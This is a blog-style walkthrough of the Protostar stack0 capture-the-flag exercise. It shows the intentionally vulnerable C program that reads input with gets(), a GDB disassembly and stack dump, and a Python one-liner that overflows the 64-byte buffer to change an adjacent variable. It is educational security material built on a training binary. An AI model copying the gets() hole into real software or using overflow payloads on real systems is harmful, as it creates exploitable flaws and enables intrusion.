---
title: Protostar Writeup - stack0
updated: 2018-07-25 13:25
---

## Protostar - stack0

This post is a writeup for the Protostack - stack0 challenge. Before continuing further, I strongly advice that you first try them out yourself.
Here's the [link](https://exploit-exercises.com/protostar/stack0/). The first challenge is simple for a person doing CTF's for a while. This challenge is actually meant for beginners inorder to introduce them to CTF's.
I assume that if you got stuck here, you atleast have a VM running the Protostart iso, if not that's a good first challenge if you have never used VM's.

### stack0

If you read the description of the challenge you will see that all we have to do is modify a variable. Here's the attached code which is also present on the site.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];
    modified = 0;
    gets(buffer);

    if(modified != 0) {
        printf("you have changed the 'modified' variable\n");
    } else {
        printf("Try again?\n");
    }
}
```

So let's analyze this code. We have some a variable called modified which we need to modify(ironic), note that modified is declared as volatile, this tells the compiler to not apply any optimizations to it. Then we have a buffer of 64 bytes.
Then we have modified set to 0 and we take some input. Now it's easy to see that there's no way to modify the modified variable(atleast not directly).
Now what options do we have? The only attack surface I could think of here is the `gets()` function. Looking at the man pages of it I came across something interesting in the bugs section.

> Never use gets()...impossible to tell...how many characters it will read...has been used to break computer security.

hmmm...interesting. Exploiting this has something to do with how memory is layed out. To keep things simple, when we declare a variable, it is reserved or stored on the stack. So if you understood what that means, buffer as well as modified should be on the stack.
And from the man pages we know that `gets()` has no limit on reading. So what happens if we read beyond 64 bytes? Let's try writing beyond 64 bytes. Let's fire up the GDB and take a look at what we have.

```shell
$ gdb stack0
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x080483f4 <main+0>:	push   ebp
0x080483f5 <main+1>:	mov    ebp,esp
0x080483f7 <main+3>:	and    esp,0xfffffff0
0x080483fa <main+6>:	sub    esp,0x60
0x080483fd <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:	lea    eax,[esp+0x1c]
0x08048409 <main+21>:	mov    DWORD PTR [esp],eax
0x0804840c <main+24>:	call   0x804830c <gets@plt>
0x08048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:	test   eax,eax
0x08048417 <main+35>:	je     0x8048427 <main+51>
0x08048419 <main+37>:	mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:	call   0x804832c <puts@plt>
0x08048425 <main+49>:	jmp    0x8048433 <main+63>
0x08048427 <main+51>:	mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:	call   0x804832c <puts@plt>
0x08048433 <main+63>:	leave
0x08048434 <main+64>:	ret
End of assembler dump.
```

Nothing interesting here. We know that `[esp+0x5c]` is the modified variable just by looking at the assembly, since a 0 is moved into that location.
Let's set a break point just after the `gets()` call, run the program and take a look at what happens.

```shell
(gdb) break *0x08048411
Breakpoint 1 at 0x8048411: file stack0/stack0.c, line 13.
(gdb) r
Starting program: /opt/protostar/bin/stack0
AAAAAAAAAAAAAA

Breakpoint 1, main (argc=1, argv=0xbffff854) at stack0/stack0.c:13
...
(gdb) x/24wx $esp
0xbffff740:	0xbffff75c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff750:	0xb7fd7ff4	0xb7ec6165	0xbffff768	0x41414141
0xbffff760:	0x41414141	0x41414141	0xbf004141	0x080482e8
0xbffff770:	0xb7ff1040	0x08049620	0xbffff7a8	0x08048469
0xbffff780:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffff7a8
0xbffff790:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000
```

Let me explain what I did. I set a break point just after the `gets()` call because I want to get an idea of where on the stack the data is stored. 'A' in hex is `0x41`.
We print the first 24 (w)ords in he(x) format. You can see where our 'A's got stored. And if you take a closer look, towards the end you find the value of modified which is 0.
So what we need to do is overflow the input into the modified variable and we're done. Just by observation of the stack, we see that we require a minimum of 4 * 4 * 4 + 1 bytes of data, which is co-incidently one more byte than the buffer size. More would work too, but this is the minimum.
Let's write exploit this with a little help from python and pipes.

```shell
$ python -c "print 'A' * 64 + 'B'" | ./stack0
you have changed the 'modified' variable
```

And there we have it, we have successfully modified the value of a variable, using a buffer overflow. Simple yet fundamental to understanding how not to write code.
I'll be posting more solutions in my free time. If you got this on your first try, way to go! If not, then remember 'Every expert was once a beginner'. Another little thing I would like to stress upon, is that you should keep questioning why it works the way it does. If you aren't, you aren't learning anything at all.

### Sites
[Protostar](https://exploit-exercises.com/protostar/)
[Phrack Magzine](http://phrack.org/issues/49/14.html)
[LiveOverflow](https://liveoverflow.com/)
